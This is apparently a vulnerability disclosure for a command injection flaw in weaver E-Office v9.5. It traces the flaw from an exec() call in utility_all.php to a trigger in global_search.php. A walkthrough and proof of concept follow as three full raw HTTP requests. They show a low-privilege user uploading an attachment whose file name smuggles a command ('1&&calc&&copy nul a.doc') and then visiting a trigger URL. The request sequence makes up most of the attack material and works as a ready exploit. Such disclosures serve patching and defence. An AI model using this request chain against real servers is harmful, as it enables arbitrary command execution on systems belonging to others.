weaver E-Office v9.5 Command execution vulnerabilities

official website:https://www.e-office.cn/

version:v9.5

The exploit functions appeared at lines 1007-1008 of /webroot/inc/utility_all.php. The custom function doc2txt() called exec() function, and the $path variable was controllable by users without restrictions, which could be used to inject arbitrary commands using the command connection symbol "&&".

![WPS图片(1)](https://user-images.githubusercontent.com/129963609/235029932-f4bec778-9bbc-4fa6-a846-7c60bc088e2b.png)

The vulnerability trigger point is located in the /webroot/general/file_folder/global_search.php file. We call doc2txt() at line 108 and then trace back to the source of the doc2txt() argument $FILE_PATH, Concatenate the values of ATTACHMENT_ID(folder) and ATTACHMENT_NAME(file name) columns in data table FLE_CONTENT for attachment directory (C:\eoffice9\webroot\attachment) to get the full file path.

Note that the registration global variable setting (register_globals = On) is enabled in the php configuration file (php.ini), So the value of variable $ATTACHMENT_DATA at line 93 and variable $SEARCH_DOC at line 106 requires the user to GET/POST in. And 103 lines will check the file exists, so should not be included in the file in command execution cannot use \ / | < > : * "? Special symbol.

![WPS图片(2)](https://user-images.githubusercontent.com/129963609/235030016-52b24bd8-e783-47e5-949e-ee7a159a9279.png)

Folder where the attachment is located:

![WPS图片(3)](https://user-images.githubusercontent.com/129963609/235030136-25f2738c-81bf-4d74-865f-1b1a9cef5ce3.png)

Attachment name:

![Uploading WPS图片(4).png…]()

To view the files in this directory:

![WPS图片(5)](https://user-images.githubusercontent.com/129963609/235030256-065c438b-5f31-4797-a88a-0fc77aa1ca29.png)

exploitation of vulnerability

Create a common user named test with the role of employee.

![WPS图片(6)](https://user-images.githubusercontent.com/129963609/235030325-38bebf2f-f6cd-420c-8e11-b9212270b65e.png)

Log in as the test user, go to Document Center -> New Document, create a document and upload the attachment named "1&&calc&&copy nul a.doc", then click Submit.

![WPS图片(7)](https://user-images.githubusercontent.com/129963609/235030415-6336faca-2d01-4fae-b980-5e05bc14d1e2.png)

upload attachment

![WPS图片(8)](https://user-images.githubusercontent.com/129963609/235030483-80d0a052-bda0-4a84-bdf2-b600cbdf3150.png)

upload attachment Updates data table attachment information.

![WPS图片(9)](https://user-images.githubusercontent.com/129963609/235030541-2c3592d6-026a-4247-874a-274fe05fc4e5.png)


Visit the vulnerability trigger page.
http://172.16.10.124/general/file_folder/global_search.php?ATTACHMENT_DATA=1&SEARCH_DOC=on

![WPS图片(10)](https://user-images.githubusercontent.com/129963609/235030609-358583d6-381a-4154-a17e-c5afef91303e.png)

Log in to the server to view the process and enable the Windows calculator.

![WPS图片(11)](https://user-images.githubusercontent.com/129963609/235030693-1cd83732-30a5-4ae5-bd0c-9078c0949175.png)

POC

upload attachment
```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 172.16.10.124
Content-Length: 328
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1ZCUAAAXxnYuVIZR
Accept: */*
Origin: http://172.16.10.124
Referer: http://172.16.10.124/general/file_folder/file_new/neworedit/index.php?FILE_SORT=1&func_id=7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686
Connection: close

------WebKitFormBoundary1ZCUAAAXxnYuVIZR
Content-Disposition: form-data; name="name"

1&&calc&&copy nul a.doc
------WebKitFormBoundary1ZCUAAAXxnYuVIZR
Content-Disposition: form-data; name="Filedata"; filename="1&&calc&&copy nul a.doc"
Content-Type: application/msword

aaaaa
------WebKitFormBoundary1ZCUAAAXxnYuVIZR--
```

Update the data in the data table

```
POST /general/file_folder/file_new/neworedit/submit.php?func_id=3 HTTP/1.1
Host: 172.16.10.124
Content-Length: 2426
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.10.124
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2JIQiWFev9A8p6UP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.10.124/general/file_folder/file_new/neworedit/index.php?FILE_SORT=1&func_id=7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: MODE_TILE=tree; LOGIN_LANG=cn; LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686
Connection: close

------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="check_log_id"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="attachmentIDStr"

1575146901,
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="attachmentNameStr"

1&&calc&&copy nul a.doc*
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="filename_id"

eoffice9.0功能资料
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="SORT_ID"

28
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="SUBJECT"

test
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="type_value"

1
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="file_elem"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="SMS_USER_ID"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="MOVEBILE_USER_ID"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="EMAIL_USER_ID"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="refreshno"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="content_type"

1
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="CONTENT_ID"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="OP"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="FILE_SORT"

1
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="cur_page"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="operationType"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="docStr"


------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="contentTypeStr"

html
------WebKitFormBoundary2JIQiWFev9A8p6UP
Content-Disposition: form-data; name="editorValue"


------WebKitFormBoundary2JIQiWFev9A8p6UP--
```

Access a trigger page

```
GET /general/file_folder/global_search.php?ATTACHMENT_DATA=1&SEARCH_DOC=on HTTP/1.1
Host: 172.16.10.124
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686
Connection: close
```
